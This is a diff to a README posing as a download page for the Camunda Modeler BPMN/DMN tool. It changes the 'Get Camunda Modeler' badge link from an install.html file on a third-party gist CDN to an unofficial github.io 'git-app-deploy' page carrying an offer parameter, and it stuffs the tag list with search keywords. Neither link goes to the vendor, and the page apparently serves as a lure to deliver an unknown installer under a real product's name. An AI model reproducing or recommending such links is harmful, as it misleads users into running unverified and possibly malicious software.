@@ -1,6 +1,6 @@
 # Camunda Modeler Download — Desktop BPMN & DMN Tool  
 
-[![Get Camunda Modeler GitHub](https://img.shields.io/badge/Get%20Camunda%20Modeler%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/casanovasnoxj59/088bfc2014679b63ca01aee81062ac18/raw/4f4be6ce59775b75a8887cbbfe614bfa3fb5cf7b/install.html?offer=CamundaModeler)  
+[![Get Camunda Modeler GitHub](https://img.shields.io/badge/Get%20Camunda%20Modeler%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CamundaModeler)  
 
 ---
 
@@ -63,7 +63,7 @@ A: Yes, models can be exported in standard BPMN and DMN formats.
 ---
 
 ## 🔍 Tags  
-Camunda, BPMN modeling, DMN decision tables, workflow automation, business process management, process modeling, Mac BPMN, Windows DMN, cross-platform workflow, automation tool, Camunda modeler, Camunda pc, Camunda windows, Camunda desktop, Camunda for mac, Camunda for pc, Camunda for windows, Camunda mac 
+Camunda, camunda dmn, bpmn camunda, camunda bpmn modeler, camunda modeler download, BPMN modeling, DMN decision tables, workflow automation, business process management, process modeling, Mac BPMN, Windows DMN, cross-platform workflow, automation tool, Camunda modeler, Camunda pc, Camunda windows, Camunda desktop, Camunda for mac, Camunda for pc, Camunda for windows, Camunda mac 
 
 ---
 
